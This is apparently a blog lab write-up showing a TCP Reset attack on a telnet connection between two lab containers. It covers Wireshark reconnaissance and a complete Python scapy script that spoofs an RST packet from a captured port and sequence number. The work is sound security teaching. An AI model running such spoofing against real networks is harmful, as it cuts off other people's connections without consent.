+++
title = "TCP Attack Lab 1 - TCP Reset"
date = "2023-04-26"
description = "Resetting a TCP connection."

tags = ["security","writeup",]
+++


We reset a TCP connection between two hosts on our network.

TCP is a critical protocol at the fourth layer of the OSI model of the network stack, the network layer, yet it has some vulnerabilities. We will reset, hijack, and obtain a reverse shell from a `telnet` connection between two unsuspecting users to demonstrate the vulnerabilities.

In the first part of this series, we will conduct a TCP Reset attack on the `telnet` connection.


# Setup

Please see the series [overview post](/blog/posts/tcp-attack-lab/0-overview) for setup instructions.

 
# Resetting a `telnet` Connection

In this demonstration, I will show how an attacker on the same LAN as two machines that have an existing telnet connection can reset the connection.

First, we need to simulate the `telnet` connection between User 1 and User 2. In one terminal window, establish the connection from user 1 to User 2.


# Reconnaissance 

Then, I open Wireshark and monitor the LAN interface. I select the bridge interface starting with "br-". The characters following may change if you stop and start the containers in a separate occurrence.

!["wireshark init page"](/blog/images/tcp-reset/wireshark-init.png)

Select the bridge interface.

---

In the `telnet` connection, I run a command like `echo hello` to generate some traffic over the `telnet` connection. 

!["victim telnet connection"](/blog/images/tcp-reset/telnet-init.png)

The existing telnet connection with a command executed. This image also shows the initial command used to establish the connection.

---

The last TCP packet sent from User 1 to User 2 will inform the source port number and sequence number used in the RST packet we will spoof from the attacker.

!["wireshark screen capture"](/blog/images/tcp-reset/wireshark.png)

Using Wireshark to construct our RST packet.

---


# Running the exploit

The following code will send our RST packet:

```python
from scapy.all import * 
import argparse
 
def spoof_reset_packet(src_port, seq_num):
  user1_ip = "10.9.0.6"
  user2_ip = "10.9.0.7"
  
  user1_port = src_port
  user2_port = 23
  
  ip = IP(src=user1_ip, dst=user2_ip)
  tcp = TCP(sport=user1_port, dport=user2_port, flags="R", seq=seq_num)
  pkt = ip/tcp
  
  print("SENDING RESET PACKET........")
  send(pkt, verbose=0)
   
if __name__ == "__main__":
  parser = argparse.ArgumentParser()
  parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
  parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)

  args = parser.parse_args()
  spoof_reset_packet(args.src_port, args.seq)
```

For convenience, I designed the program to take in arguments for the source port number and the sequence number. I invoke it as follows with the source port and sequence numbers taken from Wireshark.

!["attack"](/blog/images/tcp-reset/reset-attack.png)

Running the attack program with arguments for source port and sequence number.

---

When we go back to the `telnet` connection, we see that the connection was disconnected.

!["reset connection"](/blog/images/tcp-reset/reset-connection.png)

The telnet connection is reset.

---


# That's it!

In this post we learned about one exploit on TCP connections, namely the TCP Reset attack.

In the next part, we will expand on the knowledge gained from conducting the RST attack to hijack the `telnet` connection to run an arbitrary command.


### _Updated: April 26, 2023_
